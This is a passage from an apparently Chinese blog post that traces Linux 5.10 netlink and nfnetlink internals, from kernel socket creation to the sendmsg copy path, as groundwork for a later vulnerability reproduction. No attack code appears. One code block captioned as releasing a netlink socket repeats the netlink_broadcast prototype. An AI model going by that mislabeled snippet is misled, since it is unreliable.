nonblock)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>ssk：为函数 netlink_kernel_create()返回的socket。</li><li>skb：存放消息，它的data字段指向要发送的netlink消息结构，而 skb的控制块保存了消息的地址信息，宏NETLINK_CB(skb)就用于方便设置该控制块。</li><li>pid：为接收此消息进程的pid，即目标地址，如果目标为组或内核，它设置为 0。</li><li>nonblock：表示该函数是否为非阻塞，如果为1，该函数将在没有接收缓存可利用时立即返回；而如果为0，该函数在没有接收缓存可利用定时睡眠。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">netlink_broadcast</span><span class="params">(struct sock *ssk, struct sk_buff *skb, u32 pid, u32 group, <span class="keyword">gfp_t</span> allocation)</span></span>;</span><br></pre></td></tr></table></figure><p>前面的三个参数与 netlink_unicast相同，参数group为接收消息的多播组，该参数的每一个位代表一个多播组，因此如果发送给多个多播组，就把该参数设置为多个多播组组ID的位或。参数allocation为内核内存分配类型，一般地为GFP_ATOMIC或GFP_KERNEL，GFP_ATOMIC用于原子的上下文（即不可以睡眠），而GFP_KERNEL用于非原子上下文。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">netlink_broadcast</span><span class="params">(struct sock *ssk, struct sk_buff *skb, u32 pid, u32 group, <span class="keyword">gfp_t</span> allocation)</span></span>;</span><br></pre></td></tr></table></figure><p>释放 netlink socket。</p><h2 id="Netlink内核接收消息"><a href="#Netlink内核接收消息" class="headerlink" title="Netlink内核接收消息"></a>Netlink内核接收消息</h2><h3 id="Netlink初始化"><a href="#Netlink初始化" class="headerlink" title="Netlink初始化"></a>Netlink初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __net_init <span class="title">nfnetlink_net_init</span><span class="params">(struct net *net)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">nfnl</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_kernel_cfg</span> <span class="title">cfg</span> =</span> &#123;</span><br><span class="line">.groups= NFNLGRP_MAX,</span><br><span class="line">.input= nfnetlink_rcv,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">.bind= nfnetlink_bind,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">nfnl = netlink_kernel_create(net, NETLINK_NETFILTER, &amp;cfg);</span><br><span class="line"><span class="keyword">if</span> (!nfnl)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">net-&gt;nfnl_stash = nfnl;</span><br><span class="line">rcu_assign_pointer(net-&gt;nfnl, nfnl);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里主要是通过<code>netlink_kernel_create</code>函数创建了一个sock（上面的内核态Netlink socket API经发现是比较老的内核版本，下面的内容以内核5.10为例，目的是为了更贴合后续的漏洞复现），并且把这个sock给了被初始化的net，同时还注册了一组回调函数cfg，可以看到其input成员就是<code>nfnetlink_rcv</code>那么在后续如果收到<code>netlink</code>的消息后会调用该成员即<code>nfnetlink_rcv</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *</span></span><br><span class="line"><span class="class">__<span class="title">netlink_kernel_create</span>(<span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span>, <span class="title">int</span> <span class="title">unit</span>, <span class="keyword">struct</span> <span class="title">module</span> *<span class="title">module</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_kernel_cfg</span> *<span class="title">cfg</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">listeners</span> *<span class="title">listeners</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> *<span class="title">cb_mutex</span> =</span> cfg ? cfg-&gt;cb_mutex : <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> groups;</span><br><span class="line"></span><br><span class="line">BUG_ON(!nl_table);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unit &lt; <span class="number">0</span> || unit &gt;= MAX_LINKS)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sock_create_lite(PF_NETLINK, SOCK_DGRAM, unit, &amp;sock))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__netlink_create(net, sock, cb_mutex, unit, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out_sock_release_nosk;</span><br><span class="line"></span><br><span class="line">sk = sock-&gt;sk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!cfg || cfg-&gt;groups &lt; <span class="number">32</span>)</span><br><span class="line">groups = <span class="number">32</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">groups = cfg-&gt;groups;</span><br><span class="line"></span><br><span class="line">listeners = kzalloc(<span class="keyword">sizeof</span>(*listeners) + NLGRPSZ(groups), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!listeners)</span><br><span class="line"><span class="keyword">goto</span> out_sock_release;</span><br><span class="line"></span><br><span class="line">sk-&gt;sk_data_ready = netlink_data_ready;</span><br><span class="line"><span class="keyword">if</span> (cfg &amp;&amp; cfg-&gt;input)</span><br><span class="line">nlk_sk(sk)-&gt;netlink_rcv = cfg-&gt;input;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (netlink_insert(sk, <span class="number">0</span>))</span><br><span class="line"><span class="keyword">goto</span> out_sock_release;</span><br><span class="line"></span><br><span class="line">nlk = nlk_sk(sk);</span><br><span class="line">nlk-&gt;flags |= NETLINK_F_KERNEL_SOCKET;</span><br><span class="line"></span><br><span class="line">netlink_table_grab();</span><br><span class="line"><span class="keyword">if</span> (!nl_table[unit].registered) &#123;</span><br><span class="line">nl_table[unit].groups = groups;</span><br><span class="line">rcu_assign_pointer(nl_table[unit].listeners, listeners);</span><br><span class="line">nl_table[unit].cb_mutex = cb_mutex;</span><br><span class="line">nl_table[unit].<span class="keyword">module</span> = <span class="keyword">module</span>;</span><br><span class="line"><span class="keyword">if</span> (cfg) &#123;</span><br><span class="line">nl_table[unit].bind = cfg-&gt;bind;</span><br><span class="line">nl_table[unit].unbind = cfg-&gt;unbind;</span><br><span class="line">nl_table[unit].flags = cfg-&gt;flags;</span><br><span class="line"><span class="keyword">if</span> (cfg-&gt;compare)</span><br><span class="line">nl_table[unit].compare = cfg-&gt;compare;</span><br><span class="line">&#125;</span><br><span class="line">nl_table[unit].registered = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">kfree(listeners);</span><br><span class="line">nl_table[unit].registered++;</span><br><span class="line">&#125;</span><br><span class="line">netlink_table_ungrab();</span><br><span class="line"><span class="keyword">return</span> sk;</span><br><span class="line"></span><br><span class="line">out_sock_release:</span><br><span class="line">kfree(listeners);</span><br><span class="line">netlink_kernel_release(sk);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">out_sock_release_nosk:</span><br><span class="line">sock_release(sock);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__netlink_kernel_create);</span><br><span class="line"></span><br><span class="line">netlink_kernel_create(struct net *net, <span class="keyword">int</span> unit, struct netlink_kernel_cfg *cfg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __netlink_kernel_create(net, unit, THIS_MODULE, cfg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在前面将内核sock通过<code>nlk_sk</code>，并为其添加了<code>netlink_rcv</code>成员为<code>cfg-&gt;input</code>也就是最开始的<code>nfnetlink_rcv</code>函数。</p><p>这里最终会调用<code>__netlink_create</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __netlink_create(struct net *net, struct socket *sock,</span><br><span class="line">    struct mutex *cb_mutex, <span class="keyword">int</span> protocol,</span><br><span class="line">    <span class="keyword">int</span> kern)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span>;</span></span><br><span class="line"></span><br><span class="line">sock-&gt;ops = &amp;netlink_ops;</span><br><span class="line"></span><br><span class="line">sk = sk_alloc(net, PF_NETLINK, GFP_KERNEL, &amp;netlink_proto, kern);</span><br><span class="line"><span class="keyword">if</span> (!sk)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">sock_init_data(sock, sk);</span><br><span class="line"></span><br><span class="line">nlk = nlk_sk(sk);</span><br><span class="line"><span class="keyword">if</span> (cb_mutex) &#123;</span><br><span class="line">nlk-&gt;cb_mutex = cb_mutex;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">nlk-&gt;cb_mutex = &amp;nlk-&gt;cb_def_mutex;</span><br><span class="line">mutex_init(nlk-&gt;cb_mutex);</span><br><span class="line">lockdep_set_class_and_name(nlk-&gt;cb_mutex,</span><br><span class="line">   nlk_cb_mutex_keys + protocol,</span><br><span class="line">   nlk_cb_mutex_key_strings[protocol]);</span><br><span class="line">&#125;</span><br><span class="line">init_waitqueue_head(&amp;nlk-&gt;wait);</span><br><span class="line"></span><br><span class="line">sk-&gt;sk_destruct = netlink_sock_destruct;</span><br><span class="line">sk-&gt;sk_protocol = protocol;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意的是，申请的sock的ops为<code>netlink_ops</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span> <span class="title">netlink_ops</span> =</span> &#123;</span><br><span class="line">.family =PF_NETLINK,</span><br><span class="line">.owner =THIS_MODULE,</span><br><span class="line">.release =netlink_release,</span><br><span class="line">.bind =netlink_bind,</span><br><span class="line">.connect =netlink_connect,</span><br><span class="line">.socketpair =sock_no_socketpair,</span><br><span class="line">.accept =sock_no_accept,</span><br><span class="line">.getname =netlink_getname,</span><br><span class="line">.poll =datagram_poll,</span><br><span class="line">.ioctl =netlink_ioctl,</span><br><span class="line">.listen =sock_no_listen,</span><br><span class="line">.shutdown =sock_no_shutdown,</span><br><span class="line">.setsockopt =netlink_setsockopt,</span><br><span class="line">.getsockopt =netlink_getsockopt,</span><br><span class="line">.sendmsg =netlink_sendmsg,</span><br><span class="line">.recvmsg =netlink_recvmsg,</span><br><span class="line">.mmap =sock_no_mmap,</span><br><span class="line">.sendpage =sock_no_sendpage,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="sock层接收请求流程分析"><a href="#sock层接收请求流程分析" class="headerlink" title="sock层接收请求流程分析"></a>sock层接收请求流程分析</h3><p>当用户需要进行配置规则集等操作时，就需要通过netlink向内核发起请求。由于所有子系统都共用一个nfnetlink，所以在传入时需要指定子系统的id以及请求操作的id，在sock这一层的主要操作是根据这两个id选出对应的函数进行调用以及提取出数据传入该函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __sys_sendmsg(<span class="keyword">int</span> fd, struct user_msghdr __user *msg, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags,</span><br><span class="line">   <span class="keyword">bool</span> forbid_cmsg_compat)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> fput_needed, err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg_sys</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (forbid_cmsg_compat &amp;&amp; (flags &amp; MSG_CMSG_COMPAT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">sock = sockfd_lookup_light(fd, &amp;err, &amp;fput_needed);</span><br><span class="line"><span class="keyword">if</span> (!sock)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">err = ___sys_sendmsg(sock, msg, &amp;msg_sys, flags, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">fput_light(sock-&gt;file, fput_needed);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE3(sendmsg, <span class="keyword">int</span>, fd, struct user_msghdr __user *, msg, <span class="keyword">unsigned</span> <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __sys_sendmsg(fd, msg, flags, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在用户态最后是调用sendmsg向内核传递消息，這裏系統調用直接調用了<code>__sys_sendmsg</code>，首先通過fd描述符經過<code>sockfd_lookup_light</code>函數調用，找到對應的socket套接字結構實例。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct socket *<span class="title">sockfd_lookup_light</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> *err, <span class="keyword">int</span> *fput_needed)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget(fd);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line">*err = -EBADF;</span><br><span class="line"><span class="keyword">if</span> (f.file) &#123;</span><br><span class="line">sock = sock_from_file(f.file, err);</span><br><span class="line"><span class="keyword">if</span> (likely(sock)) &#123;</span><br><span class="line">*fput_needed = f.flags &amp; FDPUT_FPUT;</span><br><span class="line"><span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br><span class="line">fdput(f);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>緊接着直接調用了<code>___sys_sendmsg</code>函數，這裏的第三個參數<code>msg_sys</code>結構體同用戶態，都叫<code>msghdr</code>但是定義不同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span>*msg_name;<span class="comment">/* ptr to socket address structure */</span></span><br><span class="line"><span class="keyword">int</span>msg_namelen;<span class="comment">/* size of socket address structure */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iov_iter</span><span class="title">msg_iter</span>;</span><span class="comment">/* data */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ancillary data. msg_control_user is the user buffer used for the</span></span><br><span class="line"><span class="comment"> * recv* side when msg_control_is_user is set, msg_control is the kernel</span></span><br><span class="line"><span class="comment"> * buffer used for all other cases.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span>*msg_control;</span><br><span class="line"><span class="keyword">void</span> __user*msg_control_user;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">bool</span>msg_control_is_user : <span class="number">1</span>;</span><br><span class="line"><span class="keyword">__kernel_size_t</span>msg_controllen;<span class="comment">/* ancillary data buffer length */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>msg_flags;<span class="comment">/* flags on received message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kiocb</span>*<span class="title">msg_iocb</span>;</span><span class="comment">/* ptr to iocb for async requests */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裏比較大的區別是<code>msg_iter</code>成員，其爲<code>msg_iov</code>和<code>msg_iovlen</code>的合體。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> ___sys_sendmsg(struct socket *sock, struct user_msghdr __user *msg,</span><br><span class="line"> struct msghdr *msg_sys, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags,</span><br><span class="line"> struct used_address *used_address,</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> allowed_msghdr_flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">address</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovstack</span>[<span class="title">UIO_FASTIOV</span>], *<span class="title">iov</span> =</span> iovstack;</span><br><span class="line"><span class="keyword">ssize_t</span> err;</span><br><span class="line"></span><br><span class="line">msg_sys-&gt;msg_name = &amp;address;</span><br><span class="line"></span><br><span class="line">err = sendmsg_copy_msghdr(msg_sys, msg, flags, &amp;iov);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">err = ____sys_sendmsg(sock, msg_sys, flags, used_address,</span><br><span class="line">allowed_msghdr_flags);</span><br><span class="line">kfree(iov);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先函數內部先是定義了一個<code>iovstack</code>變量，其作用是加速用戶數據的拷貝，這裏會假設用戶數據的iovec個數不會超過<code>UIO_FASTIOV</code>個，如果超過了則會去通過<code>kmalloc_array</code>去申請內存。</p><p>這裏繼續關注<code>___sys_sendmsg</code>第五個參數，其定義爲<code>struct used_address</code>結構體</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">used_address</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">name</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> name_len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其兩個字段分別用於存放消息的地址以及消息地址的長度。该结构体主要用与sendmmsg系统调用（用于同时向一个socket地址发送多个数据包，可以避免重复的网络security检查，从而提高发送效率）保存多个数据包的目的地址。现在这里设置为NULL，表示不使用。</p><p>函數內首先調用<code>sendmsg_copy_msghdr</code>函數去将用户态的<code>msghdr</code>内容copy至内核中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sendmsg_copy_msghdr</span><span class="params">(struct msghdr *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">struct user_msghdr __user *umsg, <span class="keyword">unsigned</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">struct iovec **iov)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; MSG_CMSG_COMPAT) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_msghdr</span> __<span class="title">user</span> *<span class="title">msg_compat</span>;</span></span><br><span class="line"></span><br><span class="line">msg_compat = (struct compat_msghdr __user *) umsg;</span><br><span class="line">err = get_compat_msghdr(msg, msg_compat, <span class="literal">NULL</span>, iov);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">err = copy_msghdr_from_user(msg, umsg, <span class="literal">NULL</span>, iov);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的flags可以从前面的内容看到是不存在<code>MSG_CMSG_COMPAT</code>标识位的，所以这里会进入到<code>copy_msghdr_from_user</code>函数中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">copy_msghdr_from_user</span><span class="params">(struct msghdr *kmsg,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct user_msghdr __user *umsg,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct sockaddr __user **save_addr,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct iovec **iov)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_msghdr</span> <span class="title">msg</span>;</span></span><br><span class="line"><span class="keyword">ssize_t</span> err;</span><br><span class="line"></span><br><span class="line">err = __copy_msghdr_from_user(kmsg, umsg, save_addr, &amp;msg.msg_iov,</span><br><span class="line">&amp;msg.msg_iovlen);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">err = import_iovec(save_addr ? READ : WRITE,</span><br><span class="line">    msg.msg_iov, msg.msg_iovlen,</span><br><span class="line">    UIO_FASTIOV, iov, &amp;kmsg-&gt;msg_iter);</span><br><span class="line"><span class="keyword">return</span> err &lt; <span class="number">0</span> ? err : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要做的事情有两件，首先通过<code>__copy_msghdr_from_user</code>函数，将用户态的<code>msghdr</code>内容拷贝至内核中，其次就是将用户态的iovec拷贝至内核中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 